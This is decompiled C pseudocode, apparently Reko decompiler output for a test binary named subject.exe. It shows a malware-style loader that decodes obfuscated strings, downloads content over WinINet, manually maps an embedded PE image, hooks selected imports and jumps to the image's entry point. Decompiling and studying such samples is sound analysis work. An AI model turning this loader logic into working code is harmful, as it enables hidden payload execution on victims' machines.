// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 003E1000: Register word32 fn003E1000(Stack Eq_3 dwArg04)
word32 fn003E1000(Eq_3 dwArg04)
{
	return dwArg04 + Mem0[dwArg04 + 0x3C:word32];
}

// 003E101E: void fn003E101E(Stack (ptr32 byte) dwArg04, Stack Eq_3 dwArg08, Stack Eq_10 dwArg0C)
void fn003E101E(byte * dwArg04, Eq_3 dwArg08, SIZE_T dwArg0C)
{
	fn003E1EA7(dwArg08, dwArg04, dwArg0C);
	VirtualProtect(dwArg08, dwArg0C, 0x02, fp - 0x08);
}

// 003E10B2: Register Eq_28 fn003E10B2(Stack Eq_29 dwArg04, Stack Eq_30 dwArg08, Stack Eq_30 dwArg0C)
FARPROC fn003E10B2(HMODULE dwArg04, LPCSTR dwArg08, LPCSTR dwArg0C)
{
	Eq_28 eax_44;
	Eq_28 eax_21 = GetProcAddress(dwArg04, dwArg0C);
	if (fn003E1F8E(dwArg08, &globals->b3E3050) == 0x00)
	{
		if (fn003E1F12(0x003E3050, dwArg0C, &globals->b3E3060) == 0x00)
		{
			globals->t3E9A10 = eax_21;
			eax_44 = (Eq_28) &globals->t3E1050;
			return eax_44;
		}
		if (fn003E1F12(0x003E3060, dwArg0C, &globals->b3E3074) == 0x00)
		{
			globals->t3E9A14 = eax_21;
			eax_44 = (Eq_28) &globals->t3E1082;
			return eax_44;
		}
	}
	eax_44 = eax_21;
	return eax_44;
}

// 003E1125: Register byte fn003E1125(Stack ui32 dwArg04)
byte fn003E1125(ui32 dwArg04)
{
	return (byte) (-(dwArg04 & 0x80000000) == 0x00);
}

// 003E1139: void fn003E1139(Stack (ptr32 Eq_77) dwArg04, Stack Eq_3 dwArg08)
void fn003E1139(Eq_77 * dwArg04, Eq_3 dwArg08)
{
	globals->t3E9A18 = GetModuleHandleA(null);
	globals->t3E9A1C = dwArg08;
	struct Eq_88 * dwLoc08_219 = (word32) dwArg08 + dwArg04->dw0080;
	while (dwLoc08_219->dw000C != 0x00)
	{
		ui32 * dwLoc10_121;
		Eq_30 ecx_87 = (word32) dwArg08 + dwLoc08_219->dw000C;
		Eq_29 eax_92 = LoadLibraryA(ecx_87);
		if (dwLoc08_219->dw0004 == 0x00)
			dwLoc10_121 = (word32) dwArg08 + dwLoc08_219->dw0010;
		else
			dwLoc10_121 = (word32) dwArg08 + dwLoc08_219->dw0000;
		word32 * dwLoc18_107 = (word32) dwArg08 + dwLoc08_219->dw0010;
		while (*dwLoc10_121 != 0x00)
		{
			Eq_28 dwLoc14_152;
			if ((word32) fn003E1125(*dwLoc10_121) != 0x00)
				dwLoc14_152 = GetProcAddress(eax_92, (word32) (word16) (*dwLoc10_121 & 0xFFFF));
			else
				dwLoc14_152 = fn003E10B2(eax_92, ecx_87, (word32) dwArg08 + *dwLoc10_121 + 0x02);
			*dwLoc18_107 = (word32) dwLoc14_152;
			dwLoc18_107 = dwLoc18_107 + 0x01;
			dwLoc10_121 = dwLoc10_121 + 0x01;
		}
		dwLoc08_219 = dwLoc08_219 + 0x01;
	}
}

// 003E1270: void fn003E1270(Register ui32 ecx, Stack Eq_170 dwArg04, Stack Eq_3 dwArg08, Stack ui32 dwArg0C)
void fn003E1270(ui32 ecx, HANDLE dwArg04, Eq_3 dwArg08, ui32 dwArg0C)
{
	do
		;
	while (ReadFile(dwArg04, dwArg08, dwArg0C - (ecx & 0x00), fp - 0x08, null) != 0x00 && (ecx & 0x00) != dwArg0C);
}

// 003E12A7: void fn003E12A7(Register ui32 ecx, Stack Eq_170 dwArg04, Stack Eq_194 dwArg08, Stack ui32 dwArg0C)
void fn003E12A7(ui32 ecx, HANDLE dwArg04, LPCVOID dwArg08, ui32 dwArg0C)
{
	do
		;
	while (WriteFile(dwArg04, dwArg08, dwArg0C - (ecx & 0x00), fp - 0x08, null) != 0x00 && (ecx & 0x00) != dwArg0C);
}

// 003E12DF: void fn003E12DF(Register ui32 ecx, Stack (ptr32 Eq_216) dwArg04, Stack ui32 dwArg08, Stack uint32 dwArg0C)
void fn003E12DF(ui32 ecx, Eq_216 * dwArg04, ui32 dwArg08, uint32 dwArg0C)
{
	uint32 dwLoc08_10 = ecx & 0x00;
	while (dwLoc08_10 < dwArg0C)
	{
		fn003E12A7(dwArg08, dwArg04->t0004, dwArg08 + dwLoc08_10 * 0x04, 0x08);
		fn003E1270(dwArg08, dwArg04->t0000, dwArg08 + dwLoc08_10 * 0x04, 0x08);
		dwLoc08_10 = dwLoc08_10 + 0x02;
	}
}

// 003E1424: void fn003E1424(Stack (ptr32 Eq_245) dwArg04)
void fn003E1424(Eq_245 * dwArg04)
{
	CloseHandle(dwArg04->t0000);
	CloseHandle(dwArg04->t0004);
}

// 003E1440: Register word32 fn003E1440(Register ui32 ecx)
word32 fn003E1440(ui32 ecx)
{
	struct Eq_260 * eax_16 = fn003E1B30()->ptr0030;
	if ((word32) eax_16->b0002 == 0x00)
	{
		globals->dw411056 = 30301;
		globals->dw41105A = 5484;
		globals->dw41105E = 0x727A;
		globals->dw411062 = 8655;
		if (CreatePipe(fp - 0x24, fp - 0x14, null, 0x10) != 0x00 && CreatePipe(fp - 0x18, fp - 0x20, null, 0x10) != 0x00)
		{
			Eq_170 eax_111 = CreateThread(null, 0x00, &globals->t3E1333, fp - 0x24, 0x00, fp - 0x0C);
			fn003E12DF(ecx, fp - 0x18, 0x003E4000, globals->dw3E9A03 >> 0x02);
			fn003E1424(fp - 0x18);
			fn003E1424(fp - 0x24);
			CloseHandle(eax_111);
			struct Eq_77 * eax_147 = fn003E1000(0x003E4000);
			if (eax_147 != null)
			{
				Eq_3 v14_172 = eax_147->t0034;
				fn003E101E(&globals->b3E4000, v14_172, eax_147->t0054);
				fn003E1B40(eax_147, 0x003E4000, v14_172);
				struct Eq_77 * eax_202 = fn003E1000(v14_172);
				if (eax_202 != null)
				{
					fn003E1139(eax_202, v14_172);
					fn003E1CD1(eax_202, v14_172);
					eax_16->t0008 = v14_172;
					<anonymous> * ecx_245 = (word32) v14_172 + eax_147->dw0028;
					word32 esp_248;
					word32 ebp_249;
					byte SCZO_250;
					word32 eax_251;
					byte SZO_252;
					bool C_253;
					bool Z_254;
					word32 ecx_255;
					ecx_245();
				}
			}
		}
	}
	return 0x00;
}

// 003E15B4: void fn003E15B4(Register ui32 ecx, Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn003E15B4(ui32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	ptr32 esp_19 = fp - 0x0C;
	ui32 dwLoc0C_12 = ecx & 0x00;
	while (true)
	{
		ptr32 * esp_21 = esp_19 - 0x04;
		*esp_21 = fp - 0x08;
		*(esp_21 - 0x04) = dwArg0C;
		*(esp_21 - 0x04) = *(esp_21 - 0x04) - dwLoc0C_12;
		word32 eax_34 = dwArg08 + dwLoc0C_12;
		*(esp_21 - 0x08) = eax_34;
		*(esp_21 - 0x0C) = dwArg04;
		word32 ebp_43;
		word32 ecx_44;
		byte SZO_45;
		bool C_46;
		word32 eax_47;
		byte SCZO_48;
		bool Z_49;
		WININET.dll!InternetReadFile();
		if (eax_47 == 0x00 || (ecx & 0x00) == 0x00)
			break;
		dwLoc0C_12 = dwLoc0C_12 + (ecx & 0x00);
	}
	*(esp_19 - 0x04) = dwLoc0C_12;
}

// 003E15FA: void fn003E15FA(Stack (ptr32 byte) dwArg04)
void fn003E15FA(byte * dwArg04)
{
	while ((word32) *dwArg04 != 0x00)
	{
		*dwArg04 = (byte) (0xFF - (word32) (*dwArg04));
		dwArg04 = dwArg04 + 0x01;
	}
}

// 003E1678: Register word32 fn003E1678(Register ptr32 ebp)
word32 fn003E1678(ptr32 ebp)
{
	fn003E1DDA();
	fn003E15FA(fp - 0x54);
	fn003E15FA(fp - 0x80);
	fn003E15FA(fp - 0x9C);
	word32 ebp_311;
	byte SCZO_312;
	word32 ecx_313;
	word32 eax_314;
	bool Z_315;
	byte SZO_316;
	bool C_317;
	byte SO_318;
	ptr32 esp_310;
	WININET.dll!InternetOpenA();
	if (fp != 0x54)
	{
		int32 dwLocA0_344 = dwLocA0 & 0x00;
		while (dwLocA0_344 < 0x02)
		{
			ptr32 dwLocB0_361;
			if (dwLocA0_344 == 0x00)
				dwLocB0_361 = fp - 0x80;
			else
				dwLocB0_361 = fp - 0x9C;
			word32 * esp_362 = esp_310 - 0x04;
			*esp_362 = 0x00;
			*(esp_362 - 0x04) = 0x04083000;
			*(esp_362 - 0x08) = 0x00;
			*(esp_362 - 0x0C) = 0x00;
			*(esp_362 - 0x10) = dwLocB0_361;
			*(esp_362 - 0x14) = fp - 0x54;
			word32 ebp_379;
			byte SCZO_380;
			ui32 ecx_381;
			word32 eax_382;
			bool Z_383;
			byte SZO_384;
			bool C_385;
			byte SO_386;
			WININET.dll!InternetOpenUrlA();
			if (eax_382 != 0x00)
			{
				*(esp_310 - 0x04) = 0x1000;
				*(esp_310 - 0x08) = 0x00;
				*(esp_310 - 0x0C) = eax_382;
				fn003E15B4(ecx_381, dwArg00, dwArg04, dwArg08);
				*(esp_310 - 0x04) = eax_382;
				word32 ebp_420;
				byte SCZO_421;
				word32 ecx_422;
				word32 eax_423;
				bool Z_424;
				byte SZO_425;
				bool C_426;
				byte SO_427;
				WININET.dll!InternetCloseHandle();
			}
			dwLocA0_344 = dwLocA0_344 + 0x01;
		}
		ptr32 * esp_433 = esp_310 - 0x04;
		*esp_433 = fp - 0x54;
		word32 ebp_436;
		byte SCZO_437;
		word32 ecx_438;
		word32 eax_439;
		bool Z_440;
		byte SZO_441;
		bool C_442;
		byte SO_443;
		WININET.dll!InternetCloseHandle();
	}
	word32 * esp_337 = esp_310 - 0x04;
	*esp_337 = 0x00;
	fn003E1DE1();
	return *esp_337;
}

// 003E1B12: Register Eq_21 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	ExitProcess(fn003E1440(fn003E1678(fp - 0x04)));
}

// 003E1B30: Register word32 fn003E1B30()
word32 fn003E1B30()
{
	return fs->dw0018;
}

// 003E1B40: void fn003E1B40(Stack (ptr32 Eq_77) dwArg04, Stack word32 dwArg08, Stack Eq_3 dwArg0C)
void fn003E1B40(Eq_77 * dwArg04, word32 dwArg08, Eq_3 dwArg0C)
{
	word16 ax_17 = dwArg04->w0006;
	cui16 wLoc14_114 = wLoc14 & 0x00;
	while ((word32) wLoc14_114 < (word32) ax_17)
	{
		Eq_10 dwLoc2C_120;
		Eq_10 eax_60 = (&dwArg04->dw0080 + 0x001E)[((word32) wLoc14_114 *s 0x28 + 0x08) / 0x0084];
		Eq_10 eax_69 = (&dwArg04->dw0080 + 0x001E)[((word32) wLoc14_114 *s 0x28 + 0x10) / 0x0084];
		if (eax_60 < eax_69)
			dwLoc2C_120 = eax_60;
		else
			dwLoc2C_120 = eax_69;
		fn003E1EA7(dwArg0C + Mem0[((word32) wLoc14_114 *s 0x28 + 0x0C) + (dwArg04 + 0xF8):word32], dwArg08 + Mem0[((word32) wLoc14_114 *s 0x28 + 0x14) + (dwArg04 + 0xF8):word32], dwLoc2C_120);
		wLoc14_114 = wLoc14_114 + 0x01;
	}
}

// 003E1C09: Register ui32 fn003E1C09(Register Eq_728 ecx, Stack ui32 dwArg04)
ui32 fn003E1C09(Eq_728 ecx, ui32 dwArg04)
{
	ui32 dwLoc08_10 = ecx & 0x00;
	if ((dwArg04 & 0x04000000) != 0x00)
		dwLoc08_10 = ecx & 0x00 | 0x0200;
	ui32 dwLoc08_115;
	if ((dwArg04 & 0x20000000) != 0x00)
	{
		if ((dwArg04 & 0x40000000) != 0x00)
		{
			if ((dwArg04 & 0x80000000) != 0x00)
				dwLoc08_115 = dwLoc08_10 | 0x40;
			else
				dwLoc08_115 = dwLoc08_10 | 0x20;
		}
		else if ((dwArg04 & 0x80000000) != 0x00)
			dwLoc08_115 = dwLoc08_10 | 0x80;
		else
			dwLoc08_115 = dwLoc08_10 | 0x10;
	}
	else if ((dwArg04 & 0x40000000) != 0x00)
	{
		if ((dwArg04 & 0x80000000) != 0x00)
			dwLoc08_115 = dwLoc08_10 | 0x04;
		else
			dwLoc08_115 = dwLoc08_10 | 0x02;
	}
	else if ((dwArg04 & 0x80000000) != 0x00)
		dwLoc08_115 = dwLoc08_10 | 0x08;
	else
		dwLoc08_115 = dwLoc08_10 | 0x01;
	return dwLoc08_115;
}

// 003E1CD1: void fn003E1CD1(Stack (ptr32 Eq_77) dwArg04, Stack Eq_3 dwArg08)
void fn003E1CD1(Eq_77 * dwArg04, Eq_3 dwArg08)
{
	word16 ax_17 = dwArg04->w0006;
	cui16 wLoc14_23 = wLoc14 & 0x00;
	while ((word32) wLoc14_23 < (word32) ax_17)
	{
		VirtualProtect(dwArg08 + Mem0[((word32) wLoc14_23 *s 0x28 + 0x0C) + (dwArg04 + 0xF8):word32], Mem0[(word32) wLoc14_23 *s 0x28 + 0x08 + (dwArg04 + 0xF8):word32], fn003E1C09(dwArg04 + 0xF8, Mem0[(word32) wLoc14_23 *s 0x28 + 0x24 + (dwArg04 + 0xF8):word32]), fp - 0x18);
		wLoc14_23 = wLoc14_23 + 0x01;
	}
}

// 003E1D70: Register int32 fn003E1D70(Stack int32 dwArg04)
int32 fn003E1D70(int32 dwArg04)
{
	int32 eax_11;
	if (dwArg04 >= 0x41 && dwArg04 <= 0x5A)
		eax_11 = dwArg04 + 0x20;
	else
		eax_11 = dwArg04;
	return eax_11;
}

// 003E1DDA: void fn003E1DDA()
void fn003E1DDA()
{
}

// 003E1DE1: void fn003E1DE1()
void fn003E1DE1()
{
}

// 003E1EA7: void fn003E1EA7(Stack Eq_3 dwArg04, Stack (ptr32 byte) dwArg08, Stack Eq_10 dwArg0C)
void fn003E1EA7(Eq_3 dwArg04, byte * dwArg08, SIZE_T dwArg0C)
{
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		*dwArg04 = *dwArg08;
		dwArg04 = (word32) dwArg04 + 0x01;
		dwArg08 = dwArg08 + 0x01;
	}
}

// 003E1F12: Register int32 fn003E1F12(Register word32 ecx, Stack Eq_30 dwArg04, Stack (ptr32 byte) dwArg08)
int32 fn003E1F12(word32 ecx, LPCSTR dwArg04, byte * dwArg08)
{
	while (true)
	{
		int32 eax_31 = (word32) (*dwArg04 - *dwArg08);
		int32 dwLoc08_34 = eax_31;
		if (eax_31 != 0x00 || (int32) (*dwArg08) == 0x00)
			break;
		dwArg04 = (Eq_30) (dwArg04 + 0x01);
		dwArg08 = dwArg08 + 0x01;
	}
	if (eax_31 < 0x00)
		dwLoc08_34 = eax_31 | ~0x00;
	else if (eax_31 > 0x00)
		dwLoc08_34 = 0x01;
	return dwLoc08_34;
}

// 003E1F8E: Register word32 fn003E1F8E(Stack Eq_30 dwArg04, Stack (ptr32 byte) dwArg08)
word32 fn003E1F8E(LPCSTR dwArg04, byte * dwArg08)
{
	do
	{
		word32 eax_23 = fn003E1D70((word32) *dwArg04);
		dwArg04 = (Eq_30) (dwArg04 + 0x01);
		word32 eax_37 = fn003E1D70((word32) *dwArg08);
		dwArg08 = dwArg08 + 0x01;
	} while (eax_23 != 0x00 && eax_23 == eax_37);
	return eax_23 - eax_37;
}

